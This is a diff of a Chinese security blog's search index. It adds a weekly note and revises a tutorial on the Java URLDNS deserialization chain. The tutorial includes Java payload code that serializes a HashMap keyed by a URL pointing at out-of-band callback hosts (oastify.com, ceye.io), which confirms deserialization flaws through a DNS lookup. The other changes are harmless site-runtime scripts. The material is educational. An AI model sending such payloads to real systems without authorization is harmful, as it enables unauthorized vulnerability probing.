@@ -4,11 +4,11 @@
   
     
     <entry>
-      <title>新周记5</title>
+      <title>新周记6</title>
       <link href="/2024/03/03/%E5%91%A8%E8%AE%B0-2024-03-03-%E6%96%B0%E5%91%A8%E8%AE%B06/"/>
       <url>/2024/03/03/%E5%91%A8%E8%AE%B0-2024-03-03-%E6%96%B0%E5%91%A8%E8%AE%B06/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>总结:</p><p><a href="https://hades-blog.github.io/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/">https://hades-blog.github.io/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E7%89%B9%E6%80%A7%E5%88%A9%E7%94%A8/</a></p><p><a href="https://hades-blog.github.io/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">https://hades-blog.github.io/2024/03/01/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-Nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</a></p><p><a href="https://hades-blog.github.io/2024/03/02/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/">https://hades-blog.github.io/2024/03/02/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/</a></p>]]></content>
       
       
       <categories>
@@ -33,7 +33,7 @@
       <link href="/2024/03/02/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/"/>
       <url>/2024/03/02/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-URLDNS%E9%93%BE/</url>
       
-        <content type="html"><![CDATA[<p>URLDNS链是一种常用于验证反序列化漏洞的技术。它利用反序列化过程中的特定行为来触发DNS解析，从而帮助验证者确认是否存在漏洞。以下是该技术的详细解释和示例代码的格式化版本。</p><p><code>hashmap.put(URL,x)-&gt;hash(URL)-&gt;URL.hashcode-()&gt;handler.hashcode()-&gt;getHostAddress()</code></p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><ul><li>创建hashmap和URL对象：首先，创建一个HashMap实例和一个URL对象。</li><li>使用put存入数据到hashmap中：将URL对象作为键，任意值作为值存入HashMap中。</li><li>在HashMap调用put时，调用了HashMap.java中的hash函数：这是HashMap内部用于计算键的哈希值的函数。</li><li>在hash函数中又调用了URL对象的hashCode方法：这是Java内部对URL对象进行哈希计算的方法。</li><li>触发URL.java中的hashCode函数，并执行URLStreamHandler.java中的hashCode函数：URL的hashCode方法会调用其URLStreamHandler的hashCode方法。</li><li>在URLStreamHandler.java中的hashCode函数中执行了getHostAddress函数解析了URL，获取IP，因此进行了DNS解析：这是触发DNS解析的关键步骤。</li></ul><p>示例代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建hashmap和URL对象</span></span><br><span class="line"><span class="type">HashMap</span> <span class="variable">hashmap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://example.oastify.com&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用反射修改URL对象的hashCode属性</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">hashcodeField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashcodeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">hashcodeField.set(url, <span class="number">1234</span>); <span class="comment">// 先设置为非-1的值</span></span><br><span class="line">hashmap.put(url, <span class="number">1</span>); <span class="comment">// 存入数据到hashmap中</span></span><br><span class="line">hashcodeField.set(url, -<span class="number">1</span>); <span class="comment">// 再通过反射技术改回-1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 序列化hashmap</span></span><br><span class="line">serialize(hashmap);</span><br></pre></td></tr></table></figure><h2 id="利用和触发"><a href="#利用和触发" class="headerlink" title="利用和触发"></a>利用和触发</h2><p>从上面调用链中不难发现一个关键属性 URL.java中的hashCode属性<br>当属性hashCode为-1时，即hashmap未被初始化过（没有放过数据），才能继续进入上面的链子，否则<br>不会触发链子</p><p>要修改 hashCode 先为不是 -1 的值，再利用反射改回 -1 其实很简单，我们先获取类，并且实例化对象。我们来看 Payload，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里不要发起请求</span></span><br><span class="line"></span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line"></span><br><span class="line"><span class="type">Field</span> <span class="variable">hashcodefile</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line"></span><br><span class="line">hashcodefile.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">hashcodefile.set(url,<span class="number">1234</span>);</span><br><span class="line"></span><br><span class="line">hashmap.put(url,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span></span><br><span class="line"></span><br><span class="line">hashcodefile.set(url,-<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">serialize(hashmap);</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>HashMap.readObject()：在反序列化过程中读取HashMap对象。</li><li>HashMap.putVal()：在HashMap中插入键值对。</li><li>HashMap.hash()：计算键的哈希值。</li><li>URL.hashCode()：计算URL对象的哈希值。</li><li>URL.StreamHandler.hashCode()：由URL的hashCode方法调用，进一步处理哈希计算。</li><li>URL.StreamHandler.getHostAddress()：触发DNS解析的关键方法。</li></ul>]]></content>
+        <content type="html"><![CDATA[<p>URLDNS链是一种常用于验证反序列化漏洞的技术。它利用反序列化过程中的特定行为来触发DNS解析，从而帮助验证者确认是否存在漏洞。以下是该技术的详细解释和示例代码的格式化版本。</p><h2 id="利用链"><a href="#利用链" class="headerlink" title="利用链"></a>利用链</h2><p><strong><code>hashmap.put(URL,x)--&gt;hash(URL)--&gt;URL.hashcode()--&gt;handler.hashcode()--&gt;getHostAddress()</code></strong></p><ul><li>创建hashmap和URL对象：首先，创建一个HashMap实例和一个URL对象。</li><li>使用put存入数据到hashmap中：将URL对象作为键，任意值作为值存入HashMap中。</li><li>在HashMap调用put时，调用了HashMap.java中的hash函数：这是HashMap内部用于计算键的哈希值的函数。</li></ul><p><img src="https://s2.loli.net/2024/03/04/jAbp1XFqRM8GDa4.png" alt="image.png"></p><ul><li>在hash函数中又调用了URL对象的hashCode方法：这是Java内部对URL对象进行哈希计算的方法。</li></ul><p><img src="https://s2.loli.net/2024/03/04/LQVMOyurvmKpzJi.png" alt="image.png"></p><ul><li>触发URL.java中的hashCode函数，并执行URLStreamHandler.java中的hashCode函数：URL的hashCode方法会调用其URLStreamHandler的hashCode方法。</li></ul><p><img src="https://s2.loli.net/2024/03/04/9RXq4HKiEsZpxcd.png" alt="image.png"></p><ul><li>在URLStreamHandler.java中的hashCode函数中执行了getHostAddress函数解析了URL，获取IP，因此进行了DNS解析：这是触发DNS解析的关键步骤。</li></ul><p><img src="https://s2.loli.net/2024/03/04/1J47aPwSj6G3AvI.png" alt="image.png"></p><p>示例代码:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Urldns</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        HashMap&lt;URL,Integer&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;URL,Integer&gt;();</span><br><span class="line">        URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://mytest.kz53rm.ceye.io&quot;</span>);</span><br><span class="line">        hashMap.put(url,<span class="number">8</span>);</span><br><span class="line">        Utils.UnSerialize();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="利用和触发"><a href="#利用和触发" class="headerlink" title="利用和触发"></a>利用和触发</h2><p>从上面调用链中不难发现一个关键属性 URL.java中的hashCode属性<br>当属性hashCode为-1时，即hashmap未被初始化过（没有放过数据），才能继续进入上面的链子，否则<br>不会触发链子</p><p>要修改 hashCode 先为不是 -1 的值，再利用反射改回 -1 其实很简单，我们先获取类，并且实例化对象。我们来看 Payload，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这里不要发起请求</span></span><br><span class="line"><span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://bl00nzimnnujskz418kboqxt9kfb30.oastify.com&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> url.getClass();</span><br><span class="line"><span class="type">Field</span> <span class="variable">hashcodefile</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">hashcodefile.setAccessible(<span class="literal">true</span>);</span><br><span class="line">hashcodefile.set(url,<span class="number">1234</span>);</span><br><span class="line">hashmap.put(url,<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 这里把 hashCode 改为 -1； 通过反射的技术改变已有对象的属性</span></span><br><span class="line">hashcodefile.set(url,-<span class="number">1</span>);</span><br><span class="line">serialize(hashmap);</span><br></pre></td></tr></table></figure><p>总结：</p><ul><li>HashMap.readObject()：在反序列化过程中读取HashMap对象。</li><li>HashMap.putVal()：在HashMap中插入键值对。</li><li>HashMap.hash()：计算键的哈希值。</li><li>URL.hashCode()：计算URL对象的哈希值。</li><li>URL.StreamHandler.hashCode()：由URL的hashCode方法调用，进一步处理哈希计算。</li><li>URL.StreamHandler.getHostAddress()：触发DNS解析的关键方法。</li></ul>]]></content>
       
       
       <categories>
@@ -1307,11 +1307,11 @@
     
     
     <entry>
-      <title>关于</title>
-      <link href="/about/index.html"/>
-      <url>/about/index.html</url>
+      <title></title>
+      <link href="/js/lib_runtime.js"/>
+      <url>/js/lib_runtime.js</url>
       
-        <content type="html"><![CDATA[<!-- GitCalendar容器 --><div id="gitZone"> </div>]]></content>
+        <content type="html"><![CDATA[setInterval(() => {  let create_time = Math.round(new Date('2023-8-19 13:34:00').getTime() / 1000); //在此行修改建站时间  let timestamp = Math.round((new Date().getTime()) / 1000);  let second = timestamp - create_time;  let time = new Array(0, 0, 0, 0, 0);  var nol = function(h){    return h>9?h:'0'+h;  }  if (second >= 365 * 24 * 3600) {    time[0] = parseInt(second / (365 * 24 * 3600));    second %= 365 * 24 * 3600;  }  if (second >= 24 * 3600) {    time[1] = parseInt(second / (24 * 3600));    second %= 24 * 3600;  }  if (second >= 3600) {    time[2] = nol(parseInt(second / 3600));    second %= 3600;  }  if (second >= 60) {    time[3] = nol(parseInt(second / 60));    second %= 60;  }  if (second > 0) {    time[4] = nol(second);  }  if ((Number(time[2])<22) && (Number(time[2])>7)){    currentTimeHtml ="<img class='boardsign' src='https://img.shields.io/badge/阎王殿-营业中-6adea8?style=social&logo=cakephp' title='距离第十八层还有不少距离哦'><div id='runtime'>" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  else{    currentTimeHtml ="<img class='boardsign' src='https://img.shields.io/badge/阎王殿-打烊了-6adea8?style=social&logo=coffeescript' title='这里的人也是要休息的QWQ'><div id='runtime'>" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  document.getElementById("workboard").innerHTML = currentTimeHtml;}, 1000);]]></content>
       
     </entry>
     
@@ -1340,9 +1340,9 @@
     
     
     <entry>
-      <title>电影</title>
-      <link href="/movies/index.html"/>
-      <url>/movies/index.html</url>
+      <title>友链</title>
+      <link href="/link/index.html"/>
+      <url>/link/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -1351,20 +1351,31 @@
     
     
     <entry>
-      <title></title>
-      <link href="/js/lib_runtime.js"/>
-      <url>/js/lib_runtime.js</url>
+      <title>关于</title>
+      <link href="/about/index.html"/>
+      <url>/about/index.html</url>
       
-        <content type="html"><![CDATA[setInterval(() => {  let create_time = Math.round(new Date('2023-8-19 13:34:00').getTime() / 1000); //在此行修改建站时间  let timestamp = Math.round((new Date().getTime()) / 1000);  let second = timestamp - create_time;  let time = new Array(0, 0, 0, 0, 0);  var nol = function(h){    return h>9?h:'0'+h;  }  if (second >= 365 * 24 * 3600) {    time[0] = parseInt(second / (365 * 24 * 3600));    second %= 365 * 24 * 3600;  }  if (second >= 24 * 3600) {    time[1] = parseInt(second / (24 * 3600));    second %= 24 * 3600;  }  if (second >= 3600) {    time[2] = nol(parseInt(second / 3600));    second %= 3600;  }  if (second >= 60) {    time[3] = nol(parseInt(second / 60));    second %= 60;  }  if (second > 0) {    time[4] = nol(second);  }  if ((Number(time[2])<22) && (Number(time[2])>7)){    currentTimeHtml ="<img class='boardsign' src='https://img.shields.io/badge/阎王殿-营业中-6adea8?style=social&logo=cakephp' title='距离第十八层还有不少距离哦'><div id='runtime'>" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  else{    currentTimeHtml ="<img class='boardsign' src='https://img.shields.io/badge/阎王殿-打烊了-6adea8?style=social&logo=coffeescript' title='这里的人也是要休息的QWQ'><div id='runtime'>" + time[0] + ' YEAR ' + time[1] + ' DAYS ' + time[2] + ' : ' + time[3] + ' : ' + time[4] + '</div>';  }  document.getElementById("workboard").innerHTML = currentTimeHtml;}, 1000);]]></content>
+        <content type="html"><![CDATA[<!-- GitCalendar容器 --><div id="gitZone"> </div>]]></content>
       
     </entry>
     
     
     
     <entry>
-      <title>友链</title>
-      <link href="/link/index.html"/>
-      <url>/link/index.html</url>
+      <title></title>
+      <link href="/js/runtime.js"/>
+      <url>/js/runtime.js</url>
+      
+        <content type="html"><![CDATA[var now = new Date; function createtime() { now.setTime(now.getTime() + 1e3); var e = new Date("08/01/2022 00:00:00"), t = Math.trunc(234e8 + (now - e) / 1e3 * 17), a = (t / 1496e5).toFixed(6), o = new Date("08/09/2022 00:00:00"), n = (now - o) / 1e3 / 60 / 60 / 24, r = Math.floor(n), i = (now - o) / 1e3 / 60 / 60 - 24 * r, s = Math.floor(i); 1 == String(s).length && (s = "0" + s); var d = (now - o) / 1e3 / 60 - 1440 * r - 60 * s, l = Math.floor(d); 1 == String(l).length && (l = "0" + l); var g = (now - o) / 1e3 - 86400 * r - 3600 * s - 60 * l, b = Math.round(g); 1 == String(b).length && (b = "0" + b); let c = ""; c = s < 18 && s >= 9 ? `<img class='boardsign' src='https://sourcebucket.s3.ladydaily.com/badge/F小屋-科研摸鱼中.svg' title='什么时候能够实现财富自由呀~'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>` : `<img class='boardsign' src='https://sourcebucket.s3.ladydaily.com/badge/F小屋-下班休息啦.svg' title='下班了就该开开心心地玩耍~'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = c) } setInterval((() => { createtime() }), 1e3);]]></content>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>电影</title>
+      <link href="/movies/index.html"/>
+      <url>/movies/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
       
@@ -1389,17 +1400,6 @@
       <url>/music/index.html</url>
       
         <content type="html"><![CDATA[]]></content>
-      
-    </entry>
-    
-    
-    
-    <entry>
-      <title></title>
-      <link href="/js/runtime.js"/>
-      <url>/js/runtime.js</url>
-      
-        <content type="html"><![CDATA[var now = new Date; function createtime() { now.setTime(now.getTime() + 1e3); var e = new Date("08/01/2022 00:00:00"), t = Math.trunc(234e8 + (now - e) / 1e3 * 17), a = (t / 1496e5).toFixed(6), o = new Date("08/09/2022 00:00:00"), n = (now - o) / 1e3 / 60 / 60 / 24, r = Math.floor(n), i = (now - o) / 1e3 / 60 / 60 - 24 * r, s = Math.floor(i); 1 == String(s).length && (s = "0" + s); var d = (now - o) / 1e3 / 60 - 1440 * r - 60 * s, l = Math.floor(d); 1 == String(l).length && (l = "0" + l); var g = (now - o) / 1e3 - 86400 * r - 3600 * s - 60 * l, b = Math.round(g); 1 == String(b).length && (b = "0" + b); let c = ""; c = s < 18 && s >= 9 ? `<img class='boardsign' src='https://sourcebucket.s3.ladydaily.com/badge/F小屋-科研摸鱼中.svg' title='什么时候能够实现财富自由呀~'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>` : `<img class='boardsign' src='https://sourcebucket.s3.ladydaily.com/badge/F小屋-下班休息啦.svg' title='下班了就该开开心心地玩耍~'><br> <div style="font-size:13px;font-weight:bold">本站居然运行了 ${r} 天 ${s} 小时 ${l} 分 ${b} 秒 <i id="heartbeat" class='fas fa-heartbeat'></i> <br> 旅行者 1 号当前距离地球 ${t} 千米，约为 ${a} 个天文单位 🚀</div>`, document.getElementById("workboard") && (document.getElementById("workboard").innerHTML = c) } setInterval((() => { createtime() }), 1e3);]]></content>
       
     </entry>
     
